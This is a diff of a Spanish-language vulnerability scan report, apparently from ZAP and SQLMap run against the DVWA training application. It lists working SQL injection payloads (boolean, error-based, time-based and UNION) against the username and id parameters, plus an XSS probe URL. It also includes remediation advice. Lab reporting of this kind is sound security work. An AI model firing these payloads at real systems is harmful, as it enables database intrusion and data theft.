 - **Solución:** <p>Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.</p>
 
 ---
-### Information Disclosure - Suspicious Comments
-- **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/javascript/`
-- **Método:** GET
-- **Descripción:** <p>The response appears to contain suspicious comments which may help an attacker.</p>
-- **Solución:** <p>Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.</p>
-
----
 ### User Agent Fuzzer
 - **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/weak_id/`
+- **URL:** `http://dvwa`
 - **Método:** GET
 - **Descripción:** <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
 - **Solución:** 
@@ -395,7 +275,7 @@
 ---
 ### User Agent Fuzzer
 - **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/xss_d/`
+- **URL:** `http://dvwa/`
 - **Método:** GET
 - **Descripción:** <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
 - **Solución:** 
@@ -403,7 +283,7 @@
 ---
 ### User Agent Fuzzer
 - **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/xss_d/?default`
+- **URL:** `http://dvwa/about.php`
 - **Método:** GET
 - **Descripción:** <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
 - **Solución:** 
@@ -411,16 +291,16 @@
 ---
 ### User Agent Fuzzer
 - **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/xss_r/`
-- **Método:** GET
+- **URL:** `http://dvwa/login.php`
+- **Método:** POST
 - **Descripción:** <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
 - **Solución:** 
 
 ---
 ### User Agent Fuzzer
 - **Severidad:** Informational (Medium)
-- **URL:** `http://dvwa/vulnerabilities/xss_s/`
-- **Método:** GET
+- **URL:** `http://dvwa/setup.php`
+- **Método:** POST
 - **Descripción:** <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
 - **Solución:** 
 
@@ -492,11 +372,11 @@
 ---
 
 ## Detalles Técnicos: Inyecciones SQL (SQLMap)
-### SQL Injection (AND boolean-based blind - WHERE or HAVING clause (subquery - comment))
+### SQL Injection (MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause)
 - **Severidad:** High (High)
 - **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
 - **Método:** N/A
-- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `boolean-based blind`: `username=dmHt' AND 3553=(SELECT (CASE WHEN (3553=3553) THEN 3553 ELSE (SELECT 6306 UNION SELECT 1562) END))-- -&password=eaBU&Login=Login`
+- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `boolean-based blind`: `username=OGvY' RLIKE (SELECT (CASE WHEN (6678=6678) THEN 0x4f477659 ELSE 0x28 END))-- gGwh&password=sdeo&Login=Login`
 
 #### Información Extraída (Data Dump)
 ```text
@@ -518,7 +398,7 @@ Volcado de Tabla: dvwa.users (5 registros)
 - **Severidad:** High (High)
 - **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
 - **Método:** N/A
-- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `error-based`: `username=dmHt' AND EXTRACTVALUE(7649,CONCAT(0x5c,0x7176717171,(SELECT (ELT(7649=7649,1))),0x71716b7071))-- VWUA&password=eaBU&Login=Login`
+- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `error-based`: `username=OGvY' AND EXTRACTVALUE(2382,CONCAT(0x5c,0x71766b6a71,(SELECT (ELT(2382=2382,1))),0x71706b7a71))-- WJum&password=sdeo&Login=Login`
 
 #### Información Extraída (Data Dump)
 ```text
@@ -540,7 +420,7 @@ Volcado de Tabla: dvwa.users (5 registros)
 - **Severidad:** High (High)
 - **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
 - **Método:** N/A
-- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `time-based blind`: `username=dmHt' AND (SELECT 5351 FROM (SELECT(SLEEP(5)))AxVh)-- UEUG&password=eaBU&Login=Login`
+- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `time-based blind`: `username=OGvY' AND (SELECT 8355 FROM (SELECT(SLEEP(5)))polt)-- BvZr&password=sdeo&Login=Login`
 
 #### Información Extraída (Data Dump)
 ```text
@@ -558,11 +438,99 @@ Volcado de Tabla: dvwa.users (5 registros)
 - **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>
 
 ---
-### SQL Injection (Generic UNION query (NULL) - 8 columns)
+### SQL Injection (MySQL UNION query (NULL) - 8 columns)
 - **Severidad:** High (High)
 - **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
 - **Método:** N/A
-- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `UNION query`: `username=dmHt' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717171,0x474f6b6559576c4941634f7343546c7864556e564841534d6643486f50596e4a52564a5066754943,0x71716b7071),NULL,NULL-- -&password=eaBU&Login=Login`
+- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `UNION query`: `username=OGvY' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766b6a71,0x666b656642434d4d437743754d5767787449636d49615054646c5650584b50586f646c5979544753,0x71706b7a71),NULL,NULL#&password=sdeo&Login=Login`
+
+#### Información Extraída (Data Dump)
+```text
+Volcado de Tabla: dvwa.users (5 registros)
+
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+```
+
+- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>
+
+---
+### SQL Injection (OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment))
+- **Severidad:** High (High)
+- **URL:** `http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP`
+- **Método:** N/A
+- **Descripción:** Inyección en parámetro `id` mediante un payload tipo `boolean-based blind`: `id=9749' OR NOT 6958=6958#&Submit=Submit`
+
+#### Información Extraída (Data Dump)
+```text
+Volcado de Tabla: dvwa.users (5 registros)
+
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+```
+
+- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>
+
+---
+### SQL Injection (MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE))
+- **Severidad:** High (High)
+- **URL:** `http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP`
+- **Método:** N/A
+- **Descripción:** Inyección en parámetro `id` mediante un payload tipo `error-based`: `id=9749' AND EXTRACTVALUE(9177,CONCAT(0x5c,0x7176626271,(SELECT (ELT(9177=9177,1))),0x71767a6a71))-- cySU&Submit=Submit`
+
+#### Información Extraída (Data Dump)
+```text
+Volcado de Tabla: dvwa.users (5 registros)
+
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+```
+
+- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>
+
+---
+### SQL Injection (MySQL >= 5.0.12 AND time-based blind (query SLEEP))
+- **Severidad:** High (High)
+- **URL:** `http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP`
+- **Método:** N/A
+- **Descripción:** Inyección en parámetro `id` mediante un payload tipo `time-based blind`: `id=9749' AND (SELECT 1994 FROM (SELECT(SLEEP(5)))XmoK)-- hdrj&Submit=Submit`
+
+#### Información Extraída (Data Dump)
+```text
+Volcado de Tabla: dvwa.users (5 registros)
+
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+```
+
+- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>
+
+---
+### SQL Injection (MySQL UNION query (NULL) - 2 columns)
+- **Severidad:** High (High)
+- **URL:** `http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP`
+- **Método:** N/A
+- **Descripción:** Inyección en parámetro `id` mediante un payload tipo `UNION query`: `id=9749' UNION ALL SELECT CONCAT(0x7176626271,0x7079574a514345724e706463796944457170797a5057466868546f547676774e655a4b6e6d66716d,0x71767a6a71),NULL#&Submit=Submit`
 
 #### Información Extraída (Data Dump)
 ```text
@@ -585,55 +553,29 @@ Volcado de Tabla: dvwa.users (5 registros)
 <details><summary>Ver lista completa de URLs descubiertas</summary>
 
 <ul>
-<li><code>http://dvwa/vulnerabilities/xss_r/</code></li>
+<li><code>http://dvwa/favicon.ico</code></li>
+<li><code>http://dvwa/dvwa/js/add_event_listeners.js</code></li>
 <li><code>http://dvwa/dvwa/images/spanner.png</code></li>
-<li><code>http://dvwa/vulnerabilities/javascript/</code></li>
 <li><code>http://dvwa/instructions.php?doc=readme</code></li>
 <li><code>http://dvwa/instructions.php?doc=PHPIDS-license</code></li>
-<li><code>http://dvwa/vulnerabilities/weak_id/</code></li>
-<li><code>http://dvwa/vulnerabilities/sqli_blind/</code></li>
-<li><code>http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP</code></li>
+<li><code>http://dvwa/instructions.php?doc=PDF</code></li>
+<li><code>http://dvwa/instructions.php?doc=changelog</code></li>
+<li><code>http://dvwa/dvwa/images/RandomStorm.png</code></li>
+<li><code>http://dvwa/dvwa/images/logo.png</code></li>
 <li><code>http://dvwa/docs/DVWA_v1.3.pdf</code></li>
 <li><code>http://dvwa/instructions.php</code></li>
 <li><code>http://dvwa/dvwa/js/dvwaPage.js</code></li>
-<li><code>http://dvwa/vulnerabilities/exec/</code></li>
-<li><code>http://dvwa/dvwa/images/login_logo.png</code></li>
-<li><code>http://dvwa/vulnerabilities/upload/</code></li>
-<li><code>http://dvwa/security.php?phpids=on</code></li>
-<li><code>http://dvwa/vulnerabilities/xss_s/</code></li>
-<li><code>http://dvwa/vulnerabilities/captcha/</code></li>
-<li><code>http://dvwa/instructions.php?doc=changelog</code></li>
-<li><code>http://dvwa/logout.php</code></li>
-<li><code>http://dvwa</code></li>
-<li><code>http://dvwa/vulnerabilities/xss_d/?default</code></li>
-<li><code>http://dvwa/</code></li>
-<li><code>http://dvwa/vulnerabilities/fi/?page=include.php</code></li>
-<li><code>http://dvwa/setup.php</code></li>
-<li><code>http://dvwa/vulnerabilities/csrf/?Change=Change&password_conf=ZAP&password_new=ZAP</code></li>
-<li><code>http://dvwa/favicon.ico</code></li>
-<li><code>http://dvwa/dvwa/js/add_event_listeners.js</code></li>
-<li><code>http://dvwa/phpinfo.php</code></li>
-<li><code>http://dvwa/dvwa/images/logo.png</code></li>
 <li><code>http://dvwa/login.php</code></li>
 <li><code>http://dvwa/instructions.php?doc=copying</code></li>
+<li><code>http://dvwa/dvwa/images/login_logo.png</code></li>
+<li><code>http://dvwa</code></li>
 <li><code>http://dvwa/about.php</code></li>
-<li><code>http://dvwa/sitemap.xml</code></li>
-<li><code>http://dvwa/ids_log.php</code></li>
-<li><code>http://dvwa/var/www/html/config/config.inc.php</code></li>
-<li><code>http://dvwa/vulnerabilities/sqli/</code></li>
-<li><code>http://dvwa/instructions.php?doc=PDF</code></li>
-<li><code>http://dvwa/dvwa/images/RandomStorm.png</code></li>
-<li><code>http://dvwa/security.php</code></li>
-<li><code>http://dvwa/vulnerabilities/csrf/</code></li>
-<li><code>http://dvwa/vulnerabilities/brute/</code></li>
-<li><code>http://dvwa/security.php?test=%2522%3E%3Cscript%3Eeval(window.name)%3C/script%3E</code></li>
-<li><code>http://dvwa/vulnerabilities/xss_d/</code></li>
-<li><code>http://dvwa/vulnerabilities/csp/</code></li>
 <li><code>http://dvwa/dvwa/css/main.css</code></li>
-<li><code>http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP</code></li>
+<li><code>http://dvwa/sitemap.xml</code></li>
+<li><code>http://dvwa/</code></li>
 <li><code>http://dvwa/dvwa/css/login.css</code></li>
-<li><code>http://dvwa/dvwa/images/lock.png</code></li>
 <li><code>http://dvwa/robots.txt</code></li>
-<li><code>http://dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=ZAP</code></li>
+<li><code>http://dvwa/setup.php</code></li>
+<li><code>http://dvwa/var/www/html/config/config.inc.php</code></li>
 </ul>
 </details>
